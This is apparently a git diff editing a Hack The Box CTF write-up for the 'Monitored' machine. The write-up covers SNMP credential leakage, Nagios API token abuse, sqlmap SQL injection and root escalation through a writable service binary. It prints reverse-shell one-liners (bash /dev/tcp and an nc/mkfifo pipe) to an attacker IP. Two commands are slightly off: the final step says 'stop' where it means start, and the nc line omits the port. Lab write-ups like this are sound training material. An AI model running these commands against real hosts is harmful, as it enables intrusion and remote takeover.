@@ -1,7 +1,7 @@
 # HTB - Monitored
 
 ### TL;DR
-This is a Debian host hosting a Nagios tool used by an IT team for network monitoring purposes. SNMP is also running on the host for maintenance purposes, and the public tree leaks credentials for the Nagios core. These credentials can be used to get an authentication token using Nagios API which will be subsequently used to exploit an SQLi vulnerability affecting the installed Nagios version. SQLi allows dumping the database and retrieve the admin API key that we can use to create our own admin user and get the user flag. For escalation, we abuse a writable binary found in the file system which run as root.<br>
+This is a Debian machine hosting a Nagios tool used by an IT team for network monitoring purposes. SNMP is also running on the host for maintenance purposes, and the public tree leaks credentials for the Nagios core. These credentials can be used to get an authentication token using the API which will be subsequently used to exploit an SQLi vulnerability affecting the installed Nagios version. SQLi allows dumping the database and retrieve the admin API key that we can use to create our own admin user and get the user flag. For escalation, we abuse a writable binary found in the file system which run as root.<br>
 
 ### KEYWORDS
 Nagios, ffuf enumeration, LDAP, SNMP, token authentication, SQL injection, sqlmap, binary hijacking escalation
@@ -61,7 +61,7 @@ Enumerating the web server with Firefox, we find out a Nagios Xi login portal ru
 
 ![Untitled1](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/42d078f0-d32c-42d0-a127-21a22f51b7e8)
 
-Let's start bruteforcing directories with `ffuf`. In the https://nagios.monitored.htb/nagiosxi directory we find out directories `/terminal` and an `/api`
+Let's start bruteforcing directories with `ffuf`. In the https://nagios.monitored.htb/nagiosxi directory we find out directories `/terminal` and `/api`
 ```markdown
 > ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100 -fc 404 -e .php,.html,.txt -u https://nagios.monitored.htb/nagiosxi/FUZZ
 
@@ -384,23 +384,27 @@ There are calls to a local shell script `check_host.sh` along with what seems to
 At this point we finish the enumeration phase. Let's do a summary of what we have found so far:
 - A Nagios network monitoring tool is running on port 80.
 - There are 3 login pages running at:
- * https://nagios.monitored.htb/nagiosxi/login
- * https://nagios.monitored.htb/nagiosxi/terminal
- * https://nagios.monitored.htb/nagios
-- Additionally, an authetication endpoint is available at: https://nagios.monitored.htb/nagiosxi/api/v1/authenticate<br>
+    * https://nagios.monitored.htb/nagiosxi/login
+    * https://nagios.monitored.htb/nagiosxi/terminal
+    * https://nagios.monitored.htb/nagios
+- Additionally, an authetication endpoint is available at https://nagios.monitored.htb/nagiosxi/api/v1/authenticate<br>
 - Finally, enumerating LDAP and SNMP we have found what seem to be credentials for user svc `svc:XjH7VCehowpR1xZB`
 
 
 ### USER
 Looking for Nagios vulnerabilities, we come across this one: https://www.cvedetails.com/cve/CVE-2023-40931<br>
 <br>
-It seems `ID` parameter in https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php is vulnerable to sqli. However, this is an authenticated attack, so we need to be logged into the Nagios tool before trying the injection.<br>
+It seems `ID` parameter in https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php is vulnerable to SQLi. However, we must be authenticated to launch this attack, so we need to be logged into the Nagios tool before trying the injection.<br>
 <br>
-If we remember, we have already found credentials `svc:XjH7VCehowpR1xZB`. The credential do not work in Nagios Xi portal https://nagios.monitored.htb/nagiosxi.login.php (an "user disabled" error is returned). Access is granted though in the Nagios core login at https://nagios.monitored.htb/nagios; however, nothing useful can be found here.
+If we remember, we have already found credentials `svc:XjH7VCehowpR1xZB`. The credential do not work in Nagios Xi portal https://nagios.monitored.htb/nagiosxi.login.php (an "user disabled" error is returned).<br>
+<br>
+Access is granted though in the Nagios core login at https://nagios.monitored.htb/nagios; however, nothing useful can be found here.
 
 ![Untitled2](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/68a7d2e0-d198-4f91-83c0-ffc1174e7cad)
 
-According to Nagios documentation (https://rdgroup.co.za/2018/07/10/nagios-xi-5-5-is-here/), user and password could theoretically be be used to login sending a POST request to the `/api/v1/authenticate`. I tried unsuccessfully to do so with `burpsuite` and `postman`, but finally found instructions to authenticate using `curl` in the Nagios support forum (https://support.nagios.com/forum/viewtopic.php?p=331071#p331071).<br>
+According to Nagios documentation (https://rdgroup.co.za/2018/07/10/nagios-xi-5-5-is-here/), user and password could theoretically be be used to login sending a POST request to the `/api/v1/authenticate` endpoint.<br>
+<br>
+I unsuccessfully tried to do so with `burpsuite` and `postman`, but finally found instructions in the Nagios support forum (https://support.nagios.com/forum/viewtopic.php?p=331071#p331071) to authenticate using `curl`.<br>
 <br>
 The following command performs the authentication and a token is received.
 ```markdown
@@ -411,7 +415,7 @@ The following command performs the authentication and a token is received.
 
 ![Untitled3](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/c661c39d-5ccf-4fd2-bea8-a061da0f1514)
 
-Although the `svc` account is disabled in the web login, it seems the API is still supplying tokens for this account when queried with `curl`. We can take advantage of this now and launch the sqli attack with `sqlmap` passing the token as argument.
+In summary, although the `svc` account is disabled in the web login, it seems the API is still supplying tokens for this account when queried with `curl`. We can take advantage of this now and launch the SQLi attack with `sqlmap` and passing the token as argument.
 ```markdown
 > sqlmap --batch --dbms mysql --level 3 --risk 3 -p id -u "http://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?id=1&token=a150999b9c2b5ae2bb6c7c38b7b7c48e854838fe"
 ```
@@ -422,7 +426,7 @@ You have to patiently dump the databases and tables until you find the right one
 
 ![Untitled4](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/3b6b1aa0-403f-408e-b599-2771f3a9b73b)
 
-We can use this API key to add a new admin user, I found out the API endpoint and the parameters to do so in this exploit https://www.exploit-db.com/exploits/44560.
+We can use this API key to add a new admin user. In this exploit https://www.exploit-db.com/exploits/44560 I found out the API endpoint and the parameters to do so.
 ```markdown
 > curl -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=admin17890&password=password123&name=nil&email=nil@localhost&auth_level=admin"
 {
@@ -430,20 +434,19 @@ We can use this API key to add a new admin user, I found out the API endpoint an
     "user_id": 18
 }
 ```
-Tips: make sure an ID is received, if `null` is received your user has not been correctly created and you won't be able to use it. If that's the case, try changing paramenters; for exmaple, in my case I found out the email had to finish in `@localhost` for the user to be correctly created.<br>
+Tips: make sure an `user_id` is received, if `null` is received your user has not been correctly created and you won't be able to use it. If that's the case, try changing paramenters; for example, in my case I found out the email had to finish in `@localhost` for the user to be correctly created.<br>
 <br>
 Now you can login into the Nagios Xi login site with your new admin account.
 
 ![Untitled5](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/c4c83051-db13-4d12-adf4-81c6936034a9)
 
-In the dashboard, navigate to Configure (top menu) -> Advanced configuration -> Commands -> Add new. Note: alternatively, you can edit an already existing command.
-In the command line field type a command to send a reverse shell to your attacker machine.
+In the dashboard, navigate to *Configure (top menu) -> Advanced configuration -> Commands -> Add new*. Alternatively, you can edit an already existing command. In the command line field type a command to send a reverse shell to your attacker machine.
 ```markdown
 > bash -c 'bash -i >& /dev/tcp/<your ip here>/1919 0>&1'
 ```
 Click on `Apply Changes` to save the command. Note: I constanly received errorr when trying to apply changes; however, after checking the history, I found out that as long as the `command.cfg` file is correctly saved, everything will be ok.<br>
 <br>
-To issue the command navigate to Monitoring -> Hosts -> Run check command. Start a listener and launch the command, a reverse shell is received, and you can get the user flag.
+To issue the command navigate to *Monitoring -> Hosts -> Run check command*. Start a listener and launch the command, a reverse shell is received, and you can get the user flag.
 
 ### ROOT
 Check if current user is a sudoer.
@@ -478,7 +481,7 @@ User nagios may run the following commands on localhost:
     (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
     (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
 ```
-Tt seems the user can start/stop services `nagios` and `npcd` as root without supplying a password. Enumerate the binaries related to the `nagios` and `npcd` services.
+It seems the user can start/stop services `nagios` and `npcd` as root without supplying a password. Enumerate the binaries related to the `nagios` and `npcd` services.
 ```markdown
 > find / -name nagios 2> /dev/null
 /usr/local/nagios
@@ -496,11 +499,13 @@ Turns out we have writable access to the `npcd` binary. Stop the service using t
 ```markdown
 > sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
 ```
-Now edit the `npcd` file contents and add commands to send a reverse shell.
+Now edit the `npcd` file contents and add command to send a reverse shell.
 ```markdown
+> echo '#!/bin/bash' > /usr/local/nagios/bin/npcd
+
 > echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your ip here> >/tmp/f' >> /usr/local/nagios/bin/npcd
 ```
-Start a listener on port 9001 and start the `npcd` service using the script, a root reverse shell is received.
+Launch a listener on port 9001 and start the `npcd` service using the script, a root reverse shell is received.
 ```markdown
 > sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
 ```
